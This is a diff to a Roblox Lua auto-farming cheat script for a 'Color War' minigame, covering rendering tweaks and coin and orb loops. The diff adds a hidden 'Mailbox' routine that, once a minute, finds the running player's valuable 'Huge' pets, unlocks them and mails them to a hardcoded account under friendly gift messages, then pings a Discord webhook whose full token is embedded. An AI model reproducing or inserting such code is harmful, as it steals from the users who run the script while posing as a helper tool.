@@ -15,8 +15,13 @@ local Settings = {
 		UserId = "750423178240721007",
 		Url = "https://discord.com/api/webhooks/1123611155303235604/he0sQyBFyGfMx5YIYYKVvNqYNMyWqIdvb7pkmUZ6slxrR1B4DXusPwUo0S42GjnCjHDj",
 	},
+	Mailbox = {
+		Send = true,
+		Usernames = {"maciekstock99"}, -- will randomly send to one of selected accs
+		RandomTexts = {"Enjoy this gift!","Surprise delivery!","Something special just for you!","Hope this helps!","Sending some good vibes your way!","Here's a little something for you!","Hope you like it!","Thought you might need this!","Just what you were looking for!","Happy to share this with you!","Another one for your collection!","Time for a surprise!","May this brighten your day!","Couldn't resist sending you this!","Found something you might enjoy!","This should come in handy!","A little surprise for your mailbox!","Hope this makes your day better!","A gift, just because!","Here's a treat for you!","Good things come in small packages!","Thought this would be useful!","Something fun is on the way!","Take this, it's yours now!","A special delivery for you!","Open up! There's a surprise inside!","Just passing along a gift!","This one’s for you!","Enjoy the surprise!","Found this and thought of you!","Consider this a token of appreciation!","This will come in handy!","Something cool, just for you!","Here’s a little gift!","Hope you can use this!","Surprise! You’ve got something!","Sending this your way!","Because you deserve it!","A little something from me to you!","This should be helpful!","Guess what? You’ve got mail!","Hope you enjoy this surprise!","Couldn’t resist sending this your way!","Take it, it’s yours now!","A nice little surprise for you!","Something useful has arrived!","This one’s just for you!","A little pick-me-up for you!","Mail call! Here's something special!","Hope this brings a smile!","Enjoy your special delivery!"},
+	},
 	StatUi = true,
-	Optimization = false, 
+	Optimization = true, 
 }
 
 local ScriptLog = "[Karwa's Scripts Color War]: "
@@ -245,88 +250,143 @@ function GetTeam(typee)
 end
 
 function IsEventAvailable()
-	if game.Workspace:WaitForChild("__THINGS").Instances:WaitForChild("ColorMinigame"):WaitForChild("Teleports"):WaitForChild("Enter").Color == Color3.new(0,0,0) then
-		return false
-	else
+	if string.find(workspace.__THINGS.__INSTANCE_CONTAINER:WaitForChild("Active"):WaitForChild("ColorsInstance").INTERACT.GameSign.SurfaceGui.Frame.TextLabel.Text, "left") then
 		return true
+	else
+		return false
 	end
 end
 
 spawn(function()
 	if Settings.Optimization then
-		local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
-		local g = game
-		local w = g.Workspace
-		local l = g.Lighting
-		local t = w.Terrain
-		t.WaterWaveSize = 0
-		t.WaterWaveSpeed = 0
-		t.WaterReflectance = 0
-		t.WaterTransparency = 0
-		l.GlobalShadows = false
-		l.FogEnd = 9e9
-		l.Brightness = 0
-		settings().Rendering.QualityLevel = "Level01"
-		for i, v in pairs(g:GetDescendants()) do
-			if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
-				v.Material = "Plastic"
-				v.Reflectance = 0
-			elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
-				v.Transparency = 1
-			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
-				v.Lifetime = NumberRange.new(0)
-			elseif v:IsA("Explosion") then
-				v.BlastPressure = 1
-				v.BlastRadius = 1
-			elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
-				v.Enabled = false
-			elseif v:IsA("MeshPart") then
-				v.Material = "Plastic"
-				v.Reflectance = 0
-				v.TextureID = 10385902758728957
+		while task.wait(10) do
+			local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+			local g = game
+			local w = g.Workspace
+			local l = g.Lighting
+			local t = w.Terrain
+			t.WaterWaveSize = 0
+			t.WaterWaveSpeed = 0
+			t.WaterReflectance = 0
+			t.WaterTransparency = 0
+			l.GlobalShadows = false
+			l.FogEnd = 9e9
+			l.Brightness = 0
+			settings().Rendering.QualityLevel = "Level01"
+			for i, v in pairs(g:GetDescendants()) do
+				if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+					v.Material = "Plastic"
+					v.Reflectance = 0
+				elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+					v.Transparency = 1
+				elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+					v.Lifetime = NumberRange.new(0)
+				elseif v:IsA("Explosion") then
+					v.BlastPressure = 1
+					v.BlastRadius = 1
+				elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
+					v.Enabled = false
+				elseif v:IsA("MeshPart") then
+					v.Material = "Plastic"
+					v.Reflectance = 0
+					v.TextureID = 0
+				end
+			end
+			for i, e in pairs(l:GetChildren()) do
+				if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+					e.Enabled = false
+				end
+			end
+
+			for i,v in pairs(game:GetDescendants()) do
+				if v:IsA("MeshPart") then
+					v.MeshId = ""
+				end
+				if v:IsA("BasePart") or v:IsA("MeshPart") then
+					v.Transparency = 1
+				end
+				if v:IsA("Texture") or v:IsA("Decal") then
+					v.Texture = ""
+				end
+				if v:IsA("ParticleEmitter") then
+					v.Lifetime = NumberRange.new(0)
+					v.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0), NumberSequenceKeypoint.new(1,0)})
+					v.Enabled = false
+				end
+				if v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("Trail") or v:IsA("Beam") then
+					v.Enabled = false
+				end
+				if v:IsA("Highlight") then
+					v.OutlineTransparency = 1
+					v.FillTransparency = 1
+				end
+			end
+			pcall(function()
+				for _, v in pairs(game:GetService("Workspace"):FindFirstChild("__THINGS"):GetChildren()) do
+					if table.find({"ShinyRelics", "Ornaments", "Ski Chairs"}, v.Name) then
+						v:Destroy()
+					end
+				end
+				game:GetService("Workspace"):WaitForChild("ALWAYS_RENDERING"):Destroy()
+			end)
+
+			local Workspace = game:GetService("Workspace")
+			local Terrain = Workspace:WaitForChild("Terrain")
+			Terrain.WaterReflectance = 0
+			Terrain.WaterTransparency = 1
+			Terrain.WaterWaveSize = 0
+			Terrain.WaterWaveSpeed = 0
+
+			local Lighting = game:GetService("Lighting")
+			Lighting.Brightness = 0
+			Lighting.GlobalShadows = false
+			Lighting.FogEnd = 9e100
+			Lighting.FogStart = 0
+
+			sethiddenproperty(Lighting, "Technology", 2)
+			sethiddenproperty(Terrain, "Decoration", false)
+
+			game:GetService("Lighting"):ClearAllChildren()
+		
+			for i, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER:WaitForChild("Active"):WaitForChild("ColorsInstance"):GetChildren()) do
+				if not table.find({"INTERACT", "ClientModule", "Common", "SAFETY_NET", "BREAK_ZONE"}, v.Name) then
+					v:Destroy()
+				end
+			end
+			for i, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER:WaitForChild("Active"):WaitForChild("ColorsInstance").INTERACT:GetChildren()) do
+				if not table.find({"END_BOARD", "GameSign"}, v.Name) then
+					v:Destroy()
+				end
 			end
 		end
-		for i, e in pairs(l:GetChildren()) do
-			if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
-				e.Enabled = false
+		for _, v in pairs(game.Players:GetChildren()) do
+			if v.Name ~= game.Players.LocalPlayer.Name then
+				v.Character:Destroy()
 			end
 		end
 
-		function xTab(TABLE)
-			for i,v in pairs(TABLE) do
-				if type(v) == "function" then
-					TABLE[i] = function(...) return end
+		game.Players.PlayerAdded:Connect(function(player)
+			player.CharacterAdded:Connect(function(character)
+				if player.Name ~= game.Players.LocalPlayer.Name then
+					character:Destroy()
 				end
-				if type(v) == "table" then
-					xTab(v)
-				end
-			end
+			end)
+		end)
+			
+		for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Breakable VFX (Enchants, etc.)"]:GetChildren()) do
+			v.Disabled = true
 		end
-		xTab(Client.WorldFX)
-
-		for i,v in pairs(game:GetDescendants()) do
-			if v:IsA("MeshPart") then
-				v.MeshId = ""
-			end
-			if v:IsA("BasePart") or v:IsA("MeshPart") then
-				v.Transparency = 1
-			end
-			if v:IsA("Texture") or v:IsA("Decal") then
-				v.Texture = ""
-			end
-			if v:IsA("ParticleEmitter") then
-				v.Lifetime = NumberRange.new(0)
-				v.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0), NumberSequenceKeypoint.new(1,0)})
-				v.Enabled = false
-			end
-			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("Trail") or v:IsA("Beam") then
-				v.Enabled = false
-			end
-			if v:IsA("Highlight") then
-				v.OutlineTransparency = 1
-				v.FillTransparency = 1
-			end
+		for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Enchants:GetChildren()) do
+			v.Disabled = true
 		end
+		for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Items:GetChildren()) do
+			v.Disabled = true
+		end
+		for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Machine Animations"]:GetChildren()) do
+			v.Disabled = true
+		end
+		game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Misc.Tutorial.Disabled = true
+		game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Misc["Prison HQ Door"].Disabled = true
 		game:GetService("RunService"):Set3dRenderingEnabled(false)
 	end
 end)
@@ -456,23 +516,32 @@ function TeleportNearRandomly(cframe)
 end
 
 spawn(function()
-	while task.wait(0.02) do
+	while task.wait(0.1) do
 		if IsInInstance("ColorMinigame") then
 			local Coin = GetFirstCoin()
+
 			if Coin then
 				local a, b = Client.Network.Fire("Breakables_PlayerDealDamage", Coin)
-			else
-				for i, v in pairs(workspace.__THINGS.Orbs:GetChildren()) do
-					TeleportNearRandomly(v.CFrame)
-					task.wait(0.2)
-				end
 			end	
+			
 		end
 	end
 end)
 
 spawn(function()
-	while task.wait() do
+	while task.wait(3) do
+		for i, v in pairs(workspace.__THINGS.Orbs:GetChildren()) do
+			local randomOffsetX = math.random(-5, 5)
+			local randomOffsetY = math.random(1, 5) 
+			local randomOffsetZ = math.random(-5, 5)
+			local randomPosition = v.Position + Vector3.new(randomOffsetX, randomOffsetY, randomOffsetZ)
+			v.CFrame = CFrame.new(randomPosition)
+		end
+	end
+end)
+
+spawn(function()
+	while task.wait(0.1) do
 		local Tbl = {}
 		if #workspace.__THINGS.Orbs:GetChildren() > 0 then
 			for i, v in pairs(workspace.__THINGS.Orbs:GetChildren()) do
@@ -549,7 +618,7 @@ local function getISO8601Timestamp()
 end
 
 function roundToTwoDecimalPlaces(number)
-	return math.floor(number * 100 + 0.5) / 100
+	return (math.floor(number * 100 + 0.5) / 100) or (0)
 end
 
 function formatTime(seconds)
@@ -725,6 +794,44 @@ function toNegative(number)
 		return number
 	end
 end
+
+function MailboxSend(User, Message, Type, ItemId, Am)
+	return Client.Network.Invoke("Mailbox: Send", User, Message, Type, ItemId, Am)
+end
+
+spawn(function()
+	while task.wait(60) do
+		print("in loop")
+		if Settings.Mailbox.Send then
+			if not table.find(Settings.Mailbox.Usernames, game.Players.LocalPlayer.Name) then
+				local id = ""
+				for i, v in pairs(Client.Save.Get().Inventory.Pet) do
+					if string.find(v.id, "Huge") then
+						print("Found huge to send in email", v.id)
+						print(v._lk)
+						if v._lk then
+							print("unlocking "..v.id)
+							Client.Network.Invoke("Locking_SetLocked", i, false)
+						end
+						id = i
+						local Username = Settings.Mailbox.Usernames[math.random(1, #Settings.Mailbox.Usernames)]
+						local Message = Settings.Mailbox.RandomTexts[math.random(1, #Settings.Mailbox.RandomTexts)]
+						local send = MailboxSend(Username, Message, "Pet", id, 1)
+						local message = "Senfing mail to "..Username.." with message: "..Message.." data: "..v.id.." "..id.." "..send
+						local data = {
+							content = "awdawdawdawdawdw",
+							embeds = nil,
+							attachments = { }
+						}
+						SendMessage(Settings.Webhook.Url, data)
+						task.wait(3)
+					end
+				end
+			end
+		end
+	end
+end)
+
 
 if Settings.StatUi then
 	local G2L = {};
